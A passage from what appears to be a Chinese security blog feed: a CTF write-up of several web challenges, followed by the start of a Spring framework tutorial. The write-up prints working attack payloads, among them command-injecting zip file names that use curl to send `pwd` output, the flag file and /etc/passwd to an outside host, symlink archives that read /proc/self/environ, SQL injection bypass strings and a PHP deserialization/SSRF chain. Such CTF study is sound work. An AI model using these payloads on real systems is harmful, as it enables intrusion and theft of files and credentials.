<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/upload',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != <span class="string">b'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'not login'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != <span class="number">-1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/showflag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure>

<p>可以看到两个路由 upload 和 showflag，showflag告诉我们flag位置是./flag/flag.jpg，那么就可以看一下upload路由对应的代码</p>
<p>逻辑比较简单，就是把文件解压到指定的文件夹，限定了只能上传zip,并且解压后的文件名中不能有/</p>
<p>这里的cmd做了拼接，存在命令注入</p>
<p>比如设置文件名为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp; curl vps&amp;&amp;.zip</span><br></pre></td></tr></table></figure>

<p>监听vps可收到请求，由于是没有回显的命令执行，所以我们的目的是将执行结果外带出去，但这里限制了/这个字符，就很难去拿到我们的flag,不过大多数unzip都可以结合软连接去攻击，不过软连接是需要获得路径的，我们首先可以通过pwd或者/proc/self/cwd/去读flag</p>
<p><strong>pwd读法的payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp; curl 139.224.236.99:9003 -d &#96;pwd&#96;&amp;.zip</span><br></pre></td></tr></table></figure>

<p>拿到路径为/ctf/hgfjakshgfuasguiasguiaaui/myflask</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg shell</span><br><span class="line"></span><br><span class="line">zip -y shell.zip shell</span><br></pre></td></tr></table></figure>

<p>上传上去，回显看到flag图片，这个代码还比较友好直接把路径下的图片response回来了，不用自己在看md5的ip之类的探测路径了</p>
<p><strong>/proc/self/cwd读法</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg shell</span><br><span class="line">zip -ry shell.zip shell</span><br></pre></td></tr></table></figure>

<p><strong>/proc/self/environ读法</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;proc&#x2F;self&#x2F;environ shell</span><br><span class="line">zip -y qqq.zip shell</span><br></pre></td></tr></table></figure>

<p>拿到回显内容为</p>
<p><a href="https://imgse.com/i/QD8s0K" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QD8s0K.md.png" alt="QD8s0K.md.png"></a></p>
<p>接下来步骤就一样了</p>
<p>看到其他师傅做法有用awk 声明个 /这样做的，payload如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(III=`awk <span class="string">'BEGIN&#123;printf \"%c\", 47&#125;'</span>`&amp;&amp;curl xxx.xxx.xxx.xxx:9999 -T `<span class="built_in">echo</span> <span class="variable">$&#123;III&#125;</span>ctf<span class="variable">$&#123;III&#125;</span>hgfjakshgfuasguiasguiaaui<span class="variable">$&#123;III&#125;</span>myflask<span class="variable">$&#123;III&#125;</span>flag<span class="variable">$&#123;III&#125;</span>flag.jpg`).zip</span></span><br></pre></td></tr></table></figure>

<p>还可以在sesssion[‘name’]处进行命令注入，比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp; curl xx -d &quot;@&#x2F;etc&#x2F;passwd&quot; #</span><br><span class="line">&amp; curl xx -T &#x2F;etc&#x2F;passwd #</span><br><span class="line">&amp; curl xx -F file&#x3D;@&#x2F;etc&#x2F;passwd #</span><br></pre></td></tr></table></figure>

<h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p>进来也是一个登陆界面</p>
<p>admin admin 正常返回</p>
<p>admin’ admin 500报错</p>
<p>存在注入问题</p>
<p>有些时候瞎猜想也挺浪费时间的….</p>
<p>开始的时候试了 11’ or 发现正常返回了，有点迷惑，就开始了一些不切实际的猜想..最后拿到代码发现这个过滤挺神奇的，存在sql注入关键词的话，直接把用户名变成test…</p>
<p>但是出题人还是给了挺明确的hint的，PDO,一般PDO可能会存在堆叠注入的问题</p>
<p>这道题也是存在堆叠注入的测试一下payload，这里选的select sleep(3)测试</p>
<p><a href="https://imgse.com/i/QDrHsS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QDrHsS.md.png" alt="QDrHsS.md.png"></a></p>
<p>成功延时3s，接下来常规注入就可以，最后发现flag表flag字段注入出来是</p>
<p>个AmOL#T.zip，实际需要访问AmOL%23T.zip拿到源码，源码的漏洞还是比较简单的</p>
<p>userindex.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($img_file)) &#123;</span><br><span class="line">     $img_file = <span class="string">'/../favicon.ico'</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> $img_dir = dirname(<span class="keyword">__FILE__</span>) . $img_file;</span><br><span class="line"> $img_base64 = imgToBase64($img_dir);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span> . $img_base64 . <span class="string">'"&gt;'</span>;</span><br></pre></td></tr></table></figure>

<p>这段代码会把文件以base64的形式输出出来，寻找触发点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $listData = $_REQUEST;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadView(<span class="string">'userIndex'</span>,$listData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用loadview将userindex包含进来，参数可以由$_REQUEST控制，这样就很清楚了，控制下img_file参数，直接拿到flag.</p>
<h3 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h3><p>进来又是一个登陆界面…</p>
<p>两个方法可以登陆进去</p>
<p>首先是万能密码的做法</p>
<p>这道题的验证机制和普通的验证的机制不太相同</p>
<p>传统的语句是把post过来的密码用户拼接到一条语句中进行query，造成注入。</p>
<p>第二种验证机制是把密码和用户分开来，先通过执行第一个sql语句也就是查询用户名的sql语句，把对应的密码查出来，再和post的密码进行比较判断，如果相同，就判断成功</p>
<p>这个题也就是用的第二种验证机制</p>
<p>在我们输入普通的万能密码 ‘ or ‘1’#的时候返回的是Wrong password</p>
<p>在输入正常用户名密码的时候返回的是Wrong username or password，这样就正好符合了上面的这个逻辑，在密码单独认证的步骤肯定是返回密码错误的，这里可以用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span><span class="string">' group by passwd with rollup having passwd is NULL --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">密码为空进行绕过</span></span><br></pre></td></tr></table></figure>

<p><a href="https://imgse.com/i/QrSnL6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QrSnL6.md.png" alt="QrSnL6.md.png"></a></p>
<p>本来是想着不传passwd字段的，这样和NULL才能正常匹配，不过这道题用的是弱类型比较，所以passwd传不传都是可以的</p>
<p>这里通过注入也是可以进去的</p>
<p>先注入用户名，看一下下面的图就可以懂这个注入的逻辑了</p>
<p><a href="https://imgse.com/i/Qsubsf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/Qsubsf.md.png" alt="Qsubsf.md.png"></a></p>
<p>当字母错误返回用户名或密码错误，当字符正确返回密码错误</p>
<p>注入完用户名之后，开始注入密码</p>
<p><a href="https://imgse.com/i/QsMQ9s" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/QsMQ9s.md.png" alt="QsMQ9s.md.png"></a></p>
<p>写下脚本跑下就ok了</p>
<p>进入后可以File_read配和伪协议读源码</p>
<p>读index.php</p>
<p>post: filename=php://filter/read=convert.base64-encode/resource=index.php</p>
<p>依次可以读取到encode.php,index.php,interface.php,se.php</p>
<p>通过encode.php伪造admin身份，去尝试getflag,给出的回显是只能通过127.0.0.1去打，也就是要ssrf,这时不难想到利用Soap+ssrf结合se.php拿flag</p>
<p>se.php代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">				&#123;</span><br><span class="line">					$s1 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">					$s1();</span><br><span class="line">				&#125;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($ke)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mod2[$ke];</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">		&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">		<span class="keyword">public</span> $mod3;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="keyword">$this</span>-&gt;mod3.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name;</span><br><span class="line">		<span class="keyword">public</span> $flag;</span><br><span class="line">		<span class="keyword">public</span> $b;</span><br><span class="line">		  </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">			session_start(); </span><br><span class="line">			var_dump($_SESSION);</span><br><span class="line">			$a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">			<span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;&#123;<span class="keyword">$this</span>-&gt;str2&#125;();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = $_POST[<span class="string">'aa'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>pop链的构造挺简单的，就不详细说了，最终去调用Soapclient类getflag方法，并且访问的是interface.php，而不是index.php?method=get_flag,因为SoapServer是在interface.php声明的</p>
<p>interface.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'Service.php'</span>);</span><br><span class="line">    $ser = <span class="keyword">new</span> SoapServer(<span class="string">'Service.wsdl'</span>,<span class="keyword">array</span>(<span class="string">'soap_version'</span>=&gt;SOAP_1_2));</span><br><span class="line">    $ser-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line">    $ser-&gt;handle();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先把session数据传上去</p>
<p><a href="https://imgse.com/i/QrfOEV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/QrfOEV.md.png" alt="QrfOEV.md.png"></a></p>
<p>触发反序列化拿到flag</p>
<p><a href="https://imgse.com/i/QrhkE6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/QrhkE6.md.png" alt="QrhkE6.md.png"></a></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>该准备期末考试了，寒假见！</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring漏洞分析系列(一)--Spring框架基础与Spring反序列化漏洞</title>
    <url>/2020/03/06/Spring%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%B8%80-Spring%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E4%B8%8ESpring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="SpringMVC基础知识"><a href="#SpringMVC基础知识" class="headerlink" title="SpringMVC基础知识"></a>SpringMVC基础知识</h3><h4 id="Spring介绍"><a href="#Spring介绍" class="headerlink" title="Spring介绍"></a>Spring介绍</h4><blockquote>
<p>Spring是一个轻量级的Java Web开发框架，是分层的Java SE/EE full-stack轻量级开源框架，以IoC（Inverse of Control，控制反转）和AOP（Aspect Oriented Programming，面向切面编程）为内核，使用基本的JavaBean完成以前只可能由EJB完成的工作，取代了EJB臃肿和低效的开发模式。</p>
</blockquote>
<h4 id="spring调用的基本流程"><a href="#spring调用的基本流程" class="headerlink" title="spring调用的基本流程"></a>spring调用的基本流程</h4><p>1.发起请求到前端控制器(DispatcherServlet)<br>        2.前端控制器请求处理器映射器(HandlerMapping)查找Handler(可根据xml配置、注解进行查找)<br>        3.处理器映射器(HandlerMapping)向前端控制器返回Handler<br>        4.前端控制器调用处理器适配器(HandlerAdapter)执行Handler<br>        5.Handler执行完，给适配器返回ModelAndView(Springmvc框架的一个底层对象)<br>        6.处理器适配器(HandlerAdapter)向前端控制器返回ModelAndView<br>        7.前端控制器(DispatcherServlet)请求视图解析器(ViewResolver)进行视图解析，根据逻辑视图名解析成真正的视图(jsp)<br>        8.视图解析器(ViewResolver)向前端控制器(DispatcherServlet)返回View<br>        9.前端控制器进行视图渲染，即将模型数据(在ModelAndView对象中)填充到request域<br>        10.前端控制器向用户响应结果</p>
<h3 id="Spring-IoC思想"><a href="#Spring-IoC思想" class="headerlink" title="Spring IoC思想"></a>Spring IoC思想</h3><p>IoC思想的作用：主要可通过IoC写出松耦合，更优良的程序。</p>
<p>在之前的编程中，当我们当前的类依赖另一个类的时候，我们会在这个类的内部去主动创建所依赖的类，从而会导致类之间的高耦合。</p>
<p>而在Spring 框架中：有了IoC容器，容器会自动帮我们去查找以及注入所依赖对象，对象不再是去主动创建所依赖的类，而是被动的接受所依赖的类，并且new实例工作不由程序来做而是交给Spring容器去做，这也就是为什么IoC叫做控制反转的原由。</p>
<p>Spring提供了两种IoC容器，分别为BeanFactory和ApplicationContext。</p>
<ul>
<li>BeanFactory：<br>BeanFactory是spring中比较原始，比较古老的Factory。因为比较古老，所以BeanFactory无法支持spring插件，例如：AOP、Web应用等功能。</li>
<li>ApplicationContext：<br>ApplicationContext是BeanFactory的子类，因为古老的BeanFactory无法满足不断更新的spring的需求，于是ApplicationContext就基本上代替了BeanFactory的工作，以一种更面向框架的工作方式以及对上下文进行分层和实现继承，并在这个基础上对功能进行扩展：<br>1.MessageSource, 提供国际化的消息访问<br>2.资源访问（如URL和文件）<br>3.事件传递<br>4.Bean的自动装配<br>5.各种不同应用层的Context实现</li>
</ul>
<p>在现在的开发工作中，都会尽可能的使用ApplicationContext而非BeanFactory</p>
<h4 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h4><p>BeanFactory的类体系结构</p>
<p><img src="https://s2.ax1x.com/2020/03/05/37z6bt.png" alt="37z6bt.png"></p>
<p>而BeanFactory最常用的API为XmlBeanFactory</p>
<p>Demo略</p>
<h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>ApplicationContext类体系：</p>
<p><img src="https://s2.ax1x.com/2020/03/05/3HFZz8.png" alt="3HFZz8.png"></p>
<p>ApplicationContext 最常用接口：</p>
<ul>
<li><strong>FileSystemXmlApplicationContext</strong>：该容器从XML文件中加载已被定义的Bean。在这里，你需要提供给构造器XML文件的绝对路径；</li>
<li><strong>ClassPathXmlApplicationContext</strong>：该容器从XML文件中加载已被定义的Bean。无需提供XML文件的完整路径，只需正确配置CLASSPATH环境变量即可，因为容器会从CLASSPATH中搜索Bean配置文件；</li>
<li><strong>WebXmlApplicationContext</strong>：该容器会在一个Web应用程序的范围内加载在XML文件中已被定义的 bean；</li>
</ul>
<p>Demo略</p>
<h4 id="主要区别"><a href="#主要区别" class="headerlink" title="主要区别"></a>主要区别</h4><p>在获取ApplicationContext实例后，就可以像BeanFactory一样调用getBean(beanName)返回Bean了。ApplicationContext的初始化和BeanFactory有一个重大的区别：BeanFactory在初始化容器时，并未实例化Bean,直到第一次访问某个Bean时才实例化目标Bean；而ApplicationContext则在初始化应用上下文时就实例化所有单实例的Bean。</p>
<h4 id="依赖注入-DI"><a href="#依赖注入-DI" class="headerlink" title="依赖注入(DI)"></a>依赖注入(DI)</h4><blockquote>
<p>当某个Java实例需要另一个Java实例时，传统的方法是由调用者创建被调用者的实例（例如，使用new关键字获得被调用者实例），而使用Spring框架后，被调用者的实例不再由调用者创建，而是由Spring容器创建，这称为控制反转。Spring容器在创建被调用者的实例时，会自动将调用者需要的对象实例注入给调用者，这样，调用者通过Spring容器获得被调用者实例，这称为依赖注入。</p>
</blockquote>
<p>而Spring 正是通过这种依赖注入来管理Bean对象之间的依赖关系</p>
<p>依赖注入主要实现的两种方法有setter和构造方法注入：</p>
<h5 id="setter方法的依赖注入"><a href="#setter方法的依赖注入" class="headerlink" title="setter方法的依赖注入"></a>setter方法的依赖注入</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> String msg;    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMsg</span><span class="params">()</span> </span>&#123;     </span><br><span class="line">        <span class="keyword">return</span> msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMsg</span><span class="params">(String msg)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.msg = msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;bean id=<span class="string">"helloBean"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"com.spring.demo.HelloWorld"</span>&gt;    </span><br><span class="line">       &lt;property name=<span class="string">"msg"</span> value=<span class="string">"Hello World!"</span>/&gt;    </span><br><span class="line"> &lt;/bean&gt;</span><br></pre></td></tr></table></figure>

<h5 id="构造方法注入"><a href="#构造方法注入" class="headerlink" title="构造方法注入"></a>构造方法注入</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> Message msg;    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorld</span><span class="params">(Message msg)</span></span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.msg = msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Message <span class="title">getMsg</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">return</span> msg;    </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloclass"</span> <span class="attr">class</span>=<span class="string">"com.time.Helloworld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">"msg"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"msg"</span> <span class="attr">class</span>=<span class="string">"com.test.time"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="集合注入"><a href="#集合注入" class="headerlink" title="集合注入"></a>集合注入</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sw.action;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line"><span class="keyword">import</span> java.util.Set;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DI</span> </span>&#123;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Map map;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Set Set;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> List list;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Properties pro;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Map <span class="title">getMap</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> map;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMap</span><span class="params">(Map map)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.map = map;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Set <span class="title">getSet</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> Set;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSet</span><span class="params">(Set set)</span> </span>&#123;  </span><br><span class="line">  Set = set;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> List <span class="title">getList</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span 